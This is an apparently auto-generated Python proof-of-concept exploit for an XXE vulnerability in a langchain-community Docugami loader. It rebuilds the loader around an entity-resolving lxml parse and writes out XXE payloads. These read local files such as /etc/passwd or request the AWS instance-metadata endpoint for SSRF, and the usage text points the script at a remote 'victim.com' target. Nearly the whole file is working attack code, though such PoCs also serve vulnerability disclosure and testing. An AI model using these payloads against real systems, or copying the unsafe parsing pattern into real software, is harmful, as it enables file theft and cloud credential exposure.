#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: xxe-008
# Sink: _parse_dgml
# Auto-generated — run with: python3 xxe_sink_function_parse_dgml__parse_dgml.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for XXE vulnerability in langchain-community-only.

Vulnerability: XXE (XML External Entity Injection)
Sink: _parse_dgml in langchain_community/document_loaders/docugami.py
Impact: Data exfiltration, SSRF, or local file disclosure

The sink uses lxml.etree.parse() with default settings, which resolves external
entities. The content parameter is derived from user-controlled input via the
simulated API endpoint.

This PoC demonstrates:
1. Local file disclosure (reading /etc/passwd)
2. SSRF capability (making requests to internal services)

Usage:
    python poc_xxe.py [--target http://localhost:8000] [--payload-type file|ssrf]
"""

import argparse
import sys
import io
import hashlib
from typing import Dict, List, Optional
from dataclasses import dataclass

# Try to import lxml - required for the exploit
try:
    from lxml import etree
except ImportError:
    print("[!] lxml is required. Install with: pip install lxml")
    sys.exit(1)

# Try to import requests for SSRF demonstration
try:
    import requests
except ImportError:
    print("[!] requests is required for SSRF demo. Install with: pip install requests")
    sys.exit(1)


@dataclass
class Chunk:
    """Simulated chunk class for dgml_utils.models"""
    text: str
    xpath: str
    structure: str
    tag: str
    parent: Optional['Chunk'] = None


def get_chunks(root, **kwargs):
    """
    Simulated segmentation function that extracts chunks from parsed XML.
    In the real implementation, this would be from dgml_utils.segmentation.
    """
    chunks = []
    
    # Extract text from all elements
    for elem in root.iter():
        if elem.text and elem.text.strip():
            # Build xpath
            path_parts = []
            parent = elem
            while parent is not None:
                if parent.tag:
                    path_parts.insert(0, parent.tag)
                parent = parent.getparent() if hasattr(parent, 'getparent') else None
            
            xpath = '/' + '/'.join(path_parts) if path_parts else '/'
            
            chunk = Chunk(
                text=elem.text.strip(),
                xpath=xpath,
                structure=elem.tag,
                tag=elem.tag,
            )
            chunks.append(chunk)
    
    return chunks


class DocugamiLoader:
    """
    Simplified version of the DocugamiLoader that contains the vulnerable _parse_dgml method.
    """
    
    def __init__(self, 
                 min_text_length: int = 0,
                 max_text_length: int = 10000,
                 whitespace_normalize_text: bool = True,
                 sub_chunk_tables: bool = False,
                 include_xml_tags: bool = False,
                 parent_hierarchy_levels: int = 0,
                 include_project_metadata_in_doc_metadata: bool = False):
        
        self.min_text_length = min_text_length
        self.max_text_length = max_text_length
        self.whitespace_normalize_text = whitespace_normalize_text
        self.sub_chunk_tables = sub_chunk_tables
        self.include_xml_tags = include_xml_tags
        self.parent_hierarchy_levels = parent_hierarchy_levels
        self.include_project_metadata_in_doc_metadata = include_project_metadata_in_doc_metadata
        self.parent_id_key = "parent_id"
    
    def _parse_dgml(self, content: bytes, document_name: str = "test", 
                    additional_doc_metadata: Optional[Dict] = None) -> List[Dict]:
        """
        Vulnerable sink function that parses DGML XML content.
        This is the exact implementation from the source code.
        """
        def _build_framework_chunk(dg_chunk: Chunk) -> Dict:
            _hashed_id = hashlib.md5(dg_chunk.text.encode()).hexdigest()
            metadata = {
                "xpath": dg_chunk.xpath,
                "id": _hashed_id,
                "document_name": document_name,
                "document_source": document_name,
                "structure": dg_chunk.structure,
                "tag": dg_chunk.tag,
            }
            
            text = dg_chunk.text
            if additional_doc_metadata:
                if self.include_project_metadata_in_doc_metadata:
                    metadata.update(additional_doc_metadata)
            
            return {
                "page_content": text[:self.max_text_length],
                "metadata": metadata,
            }
        
        # Parse the tree and return chunks - THIS IS THE VULNERABLE LINE
        tree = etree.parse(io.BytesIO(content))
        root = tree.getroot()
        
        dg_chunks = get_chunks(
            root,
            min_text_length=self.min_text_length,
            max_text_length=self.max_text_length,
            whitespace_normalize_text=self.whitespace_normalize_text,
            sub_chunk_tables=self.sub_chunk_tables,
            include_xml_tags=self.include_xml_tags,
            parent_hierarchy_levels=self.parent_hierarchy_levels,
        )
        
        framework_chunks: Dict[str, Dict] = {}
        for dg_chunk in dg_chunks:
            framework_chunk = _build_framework_chunk(dg_chunk)
            chunk_id = framework_chunk["metadata"].get("id")
            if chunk_id:
                framework_chunks[chunk_id] = framework_chunk
                if dg_chunk.parent:
                    framework_parent_chunk = _build_framework_chunk(dg_chunk.parent)
                    parent_id = framework_parent_chunk["metadata"].get("id")
                    if parent_id and framework_parent_chunk["page_content"]:
                        framework_chunk["metadata"][self.parent_id_key] = parent_id
                        framework_chunks[parent_id] = framework_parent_chunk
        
        return list(framework_chunks.values())


def create_xxe_payload(payload_type: str = "file", target_file: str = "/etc/passwd") -> bytes:
    """
    Create an XXE payload for demonstration.
    
    Args:
        payload_type: "file" for local file disclosure, "ssrf" for SSRF
        target_file: File to read (for file payload type)
    
    Returns:
        XML bytes with XXE payload
    """
    if payload_type == "file":
        # Payload that reads a local file
        xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<dgml>
  <node>
    <text>&xxe;</text>
  </node>
</dgml>"""
    elif payload_type == "ssrf":
        # Payload that attempts SSRF to an internal service
        xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<dgml>
  <node>
    <text>&xxe;</text>
  </node>
</dgml>"""
    else:
        raise ValueError(f"Unknown payload type: {payload_type}")
    
    return xml_payload.encode('utf-8')


def simulate_api_endpoint(payload: bytes, target_url: str = "http://localhost:8000") -> Optional[List[Dict]]:
    """
    Simulate the API endpoint that would trigger the vulnerability.
    In a real scenario, this would be a POST request to the application.
    
    Args:
        payload: XML payload bytes
        target_url: URL of the target application
    
    Returns:
        Parsed chunks if successful, None otherwise
    """
    try:
        # Simulate the API call - in reality this would be a POST request
        # with the payload as the document content
        print(f"[*] Sending payload to {target_url}")
        
        # For demonstration, we directly call the vulnerable function
        # In a real exploit, this would be triggered via the API
        loader = DocugamiLoader()
        result = loader._parse_dgml(payload, document_name="exploit_test")
        
        print(f"[+] Successfully parsed {len(result)} chunks")
        return result
        
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        return None


def demonstrate_exploit(payload_type: str = "file", target_file: str = "/etc/passwd"):
    """
    Demonstrate the XXE exploit locally.
    
    Args:
        payload_type: Type of payload to use
        target_file: File to read (for file payload type)
    """
    print(f"[*] Creating {payload_type} XXE payload...")
    
    if payload_type == "file":
        payload = create_xxe_payload("file", target_file)
        print(f"[*] Attempting to read: {target_file}")
    else:
        payload = create_xxe_payload("ssrf")
        print("[*] Attempting SSRF to AWS metadata endpoint")
    
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Payload:\n{payload.decode('utf-8')}")
    print()
    
    # Execute the exploit
    result = simulate_api_endpoint(payload)
    
    if result:
        print("\n[+] Exploit successful! Extracted data:")
        for i, chunk in enumerate(result):
            print(f"\n--- Chunk {i+1} ---")
            print(f"Content: {chunk['page_content'][:500]}...")
            print(f"Metadata: {chunk['metadata']}")
    else:
        print("\n[-] Exploit failed or no data extracted")


def main():
    parser = argparse.ArgumentParser(
        description="XXE PoC for langchain-community-only DocugamiLoader",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Read /etc/passwd
  python poc_xxe.py --payload-type file --target-file /etc/passwd
  
  # Attempt SSRF to AWS metadata
  python poc_xxe.py --payload-type ssrf
  
  # Test against a remote target
  python poc_xxe.py --target http://victim.com:8000 --payload-type file
        """
    )
    
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    
    parser.add_argument(
        "--payload-type",
        choices=["file", "ssrf"],
        default="file",
        help="Type of XXE payload (default: file)"
    )
    
    parser.add_argument(
        "--target-file",
        default="/etc/passwd",
        help="File to read for file-based XXE (default: /etc/passwd)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("XXE Exploit PoC for langchain-community-only")
    print("=" * 60)
    print()
    
    # Demonstrate the exploit locally first
    demonstrate_exploit(args.payload_type, args.target_file)
    
    print()
    print("=" * 60)
    print("Note: This PoC demonstrates the vulnerability locally.")
    print("In a real scenario, the payload would be sent to:")
    print(f"  {args.target}/api/v1/trigger")
    print("via a POST request with the XML payload as the document content.")
    print("=" * 60)


if __name__ == "__main__":
    main()
